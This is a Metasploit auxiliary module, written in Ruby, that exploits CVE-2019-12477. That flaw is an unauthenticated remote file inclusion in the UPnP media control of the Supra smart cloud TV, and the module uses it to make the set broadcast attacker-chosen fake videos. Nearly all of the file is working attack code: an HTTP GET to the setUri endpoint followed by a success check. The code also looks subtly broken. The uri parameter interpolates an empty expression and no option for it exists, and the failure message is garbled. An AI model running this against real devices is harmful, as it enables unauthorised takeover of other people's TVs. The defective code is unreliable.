##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Remote file inclusion supra smart cloud TV',
      'Description' => %q{
        This module exploits an unauthenticated remote file inclusion
        which exists in supra smart cloud TV. The UPnP protocol for supra smart
        TV doesn't have any session management and authentication, leveraging
        this a local attacker could send crafted packet to broadcast fake videos.
      },
      'References'  =>
        [
          ['CVE', '2019-12477'],
          ['URL', 'https://www.inputzero.io/2019/06/hacking-smart-tv.html']
        ],
      'Author'      =>
        [
          'Dhiraj Mishra' #Discovery & Metasploit module
        ],
      'DisclosureDate' => '2019-06-03',
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(80)
      ])
  end

  def run
     res = send_request_cgi({
        'method'   => 'GET',
        'uri'      => "/remote/media_control?action=setUri&uri=#{}"
     })
        if res && res.code == 200
            print_good("Fake video was broadcasted")
        else
            print_error("No, fake video was broadcasted")
        end
     end
  end
